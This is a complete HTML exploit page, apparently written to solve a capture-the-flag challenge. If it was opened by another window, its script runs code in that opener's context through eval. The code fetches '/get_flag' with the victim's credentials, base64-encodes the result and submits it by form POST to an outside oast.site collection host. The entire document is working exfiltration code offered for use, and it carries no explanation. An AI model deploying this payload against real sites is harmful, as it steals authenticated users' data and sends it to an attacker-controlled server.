<!DOCTYPE html>
<html>
<body>
<script>
if (window.opener) {
  window.opener.eval(`
    fetch('/get_flag', { credentials: 'include' })
      .then(r => r.text())
      .then(flag => {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/';
        
        const input = document.createElement('input');
        input.name = 'flag';
        input.value = btoa(flag);
        form.appendChild(input);

        document.body.appendChild(form);
        form.submit();
      });
  `);
}
</script>
</body>
</html>
